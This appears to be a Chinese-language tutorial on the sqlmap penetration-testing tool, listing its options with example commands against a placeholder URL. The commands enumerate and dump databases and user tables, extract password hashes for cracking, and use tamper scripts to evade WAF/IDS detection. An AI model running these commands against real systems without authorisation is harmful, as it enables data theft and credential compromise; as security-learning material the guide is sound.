
# 使用sqlmap进行sql注入
sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞获取数据库服务器的权限。具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令
~~~shell
# 安装sqlmap
# 官方网站：http://sqlmap.org/
# Github：https://github.com/sqlmapproject/sqlmap
# kali中自带sqlmap，路径 /usr/share/sqlmap
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# 在kali中可以直接使用sqlmap命令，无须加python和文件后缀名
python sqlmap.py [options]
# --batch 参数：（默认确认）不再询问是否确认。
# -u 参数：指定需要检测的url进行检测注入点，单/双引号包裹。中间如果有提示，就输入y（可以使用--batch 参数全部确认），扫描完成后，告诉存在的注入类型（布尔盲注、报错注入、时间盲注、联合注入）和使用的数据库及版本，例子：sqlmap -u 'http://xx/?id=1'
# -m 参数：指定文件，可以批量扫描文件中的url，例子：sqlmap -m urls.txt --batch 
# -D 参数：指定目标数据库，单/双引号包裹，可以指定多个数据库使用逗号分隔，常配合其他参数使用
# -T 参数：指定目标表，单/双引号包裹，常配合其他参数使用
# -C 参数：指定目标字段，单/双引号包裹，常配合其他参数使用
# --dbs 参数： 查看所有数据库，例子：sqlmap -u 'http://xx/?id=1' --dbs
# --current-db 参数： 查看当前使用的数据库，例子：sqlmap -u 'http://xx/?id=1' --current-db
# --tables 参数：查看数据库下的数据表，不指定数据库默认获取数据库中所有的表。例子：sqlmap -u 'http://xx/?id=1' -D 'security,sys' --tables
# --columns 参数：查看数据库下的数据表中的字段，不指定表名默认获取当前数据库中所有表的字段。例子：sqlmap -u 'http://xx/?id=1' -D 'security' -T 'users' --columns
# --schema 参数：查看数据库下的数据表中的字段类型，不指定表名默认获取当前数据库中所有表的字段类型。例子：sqlmap -u 'http://xx/?id=1' -D 'security' -T 'users' --schema
# --dump 参数：查看数据库下的数据表中的数据，默认获取表中的所有数据，可以使用 --start --stop 指定开始和结束的行，只获取一部分数据。例子：sqlmap -u 'http://xx/?id=1' -D 'security' -T 'users' --start 1 --stop 5 --dump
# --users 参数：获取数据库的所有用户名，例子：sqlmap -u 'http://xx/?id=1' --users
# --current-user 参数：获取当前登录数据库的用户，例子：sqlmap -u 'http://xx/?id=1' --current-user
# --passwords 参数：获取所有数据库用户的密码（哈希值）。数据库不存储明文密码，只会将密码加密后，存储密码的哈希值，所以这里只能查出来哈希值；当然可以借助工具把它们解析成明文。例子：sqlmap -u 'http://xx/?id=1' --passwords
# --privileges 参数：查看每个数据库用户都有哪些权限。例子：sqlmap -u 'http://xx/?id=1' --privileges
# --is-dba 参数：判断当前登录的用户是不是数据库的管理员账号，如果管理员，输出会显示 current user is DBA:True。例子：sqlmap -u 'http://xx/?id=1' --is-dba
# --hostname 参数：获取服务器主机名。例子：sqlmap -u 'http://xx/?id=1' --hostname
# --search 参数：搜索数据库中是否存在指定库/表/字段，需要指定库名/表名/字段名。例子：sqlmap -u 'http://xx/?id=1' -D 'security' --search 搜索数据库中有没有 security 这个数据库
# --statements 参数：获取数据库中正在执行的SQL语句，例子：sqlmap -u 'http://xx/?id=1' --statements
# --tamper 参数：SQLmap内置了很多绕过脚本，在 /usr/share/sqlmap/tamper/ 目录下，可以指定绕过脚本，绕过WAF或ids等。例如：sqlmap -u 'http://xx/?id=1' --tamper 'space2comment.py'
# --cookie 参数：指定cookie的值，单/双引号包裹，例子：sqlmap -u "http://xx?id=x" --cookie 'cookie'
# -a 参数：获取所有能获取的内容，会消耗很长时间，例子：sqlmap -u 'http://xx/?id=1' -a

# --method=GET 参数： 指定请求方式（GET/POST）
# -r 参数：检测post请求的注入点，使用BP等工具抓包，将http请求内容保存到txt文件中，指定抓包的文件，SQLmap会通过post请求方式检测目标，例子：sqlmap -r bp.txt
# --random-agent 参数： 随机切换UA（User-Agent）
# --user-agent ' ' 参数： 使用自定义的UA（User-Agent）
# --referer ' ' 参数：使用自定义的 referer
# --proxy="127.0.0.1:8080" 参数：指定代理
# --threads 10 参数：设置线程数，最高10
# --level=1 参数：执行测试的等级（1-5，默认为1，常用3）
# --risk=1 参数：风险级别（0~3，默认1，常用1），级别提高会增加数据被篡改的风险
~~~